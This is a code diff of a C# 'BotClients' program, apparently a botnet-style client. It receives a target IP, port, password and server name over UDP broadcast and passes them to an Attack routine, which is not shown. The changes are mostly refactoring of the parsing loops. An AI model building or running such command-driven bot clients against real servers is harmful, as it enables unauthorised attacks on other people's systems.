@@ -3,7 +3,6 @@ using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
-using System.Timers;
 namespace BotClients
 {
 	public class Program
@@ -12,6 +11,18 @@ namespace BotClients
 		static UdpClient client = new UdpClient(port_);
 		static IPEndPoint ep = new IPEndPoint(IPAddress.Broadcast, port_); // endpoint where server is listening
 
+		private static string GetLocalIPAddress()
+		{
+			IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
+			foreach (IPAddress ip in host.AddressList)
+			{
+				if (ip.AddressFamily == AddressFamily.InterNetwork)
+				{
+					return ip.ToString();
+				}
+			}
+			throw new Exception("No network adapters with an IPv4 address in the system!");
+		}
 
 		public static void Main(string[] args)
 		{
@@ -30,27 +41,21 @@ namespace BotClients
 					byte[] name_of_server = new byte[32];
 					int j = 0;
 					for (int i = 0; i < 4; i++)
-					{
-						ip_to_attack[j] = receivedData[i];
-						j++;
-					}
+						ip_to_attack[j++] = receivedData[i];
 					j = 0;
 					for (int i = 4; i < 6; i++)
 					{
-						port_to_attack[j] = receivedData[i];
-						j++;
+						port_to_attack[j++] = receivedData[i];
 					}
 					j = 0;
 					for (int i = 6; i < 12; i++)
 					{
-						pass_to_attack[j] = receivedData[i];
-						j++;
+						pass_to_attack[j++] = receivedData[i];
 					}
 					j = 0;
 					for (int i = 12; i < 44; i++)
 					{
-						name_of_server[j] = receivedData[i];
-						j++;
+						name_of_server[j++] = receivedData[i];
 					}
 					Attack(ip_to_attack, port_to_attack, pass_to_attack, name_of_server);
 
